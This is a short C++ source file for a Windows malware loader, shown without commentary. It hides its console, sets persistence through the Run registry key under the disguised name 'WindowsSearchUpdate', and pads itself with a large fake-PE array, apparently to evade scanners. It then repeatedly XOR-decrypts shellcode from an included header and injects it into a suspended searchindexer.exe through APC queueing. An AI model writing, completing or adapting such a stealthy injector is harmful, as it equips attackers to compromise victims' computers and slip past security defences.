#include <windows.h>
#include <wininet.h>
#include "payload.h"

#pragma comment(lib, "wininet.lib")


unsigned char junkData[100 * 1024 * 1024] = { 0x4D, 0x5A, 0x90, 0x00 };

bool IsNetworkReady() {
    return InternetCheckConnectionA("https://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0);
}

bool TryExecute() {
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);

    if (!CreateProcessA("C:\\Windows\\System32\\searchindexer.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return false;
    }

    LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, shellcodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteMem) return false;

    unsigned char* decrypted = new unsigned char[shellcodeLen];
    for (int i = 0; i < shellcodeLen; i++) {
        decrypted[i] = encryptedShellcode[i] ^ xorKey;
    }
    
    WriteProcessMemory(pi.hProcess, remoteMem, decrypted, shellcodeLen, NULL);
    DWORD oldProtect;
    VirtualProtectEx(pi.hProcess, remoteMem, shellcodeLen, PAGE_EXECUTE_READ, &oldProtect);

    QueueUserAPC((PAPCFUNC)remoteMem, pi.hThread, 0);
    ResumeThread(pi.hThread);

    delete[] decrypted;
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return true;
}

int main() {
    FreeConsole();
    
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    HKEY hkey = NULL;
    RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hkey);
    RegSetValueExA(hkey, "WindowsSearchUpdate", 0, REG_SZ, (BYTE*)path, strlen(path));
    RegCloseKey(hkey);

    while (true) {
        if (IsNetworkReady()) {
            if (TryExecute()) {
                Sleep(900000); 
            }
        }
        Sleep(60000);
    }
    return 0;
}
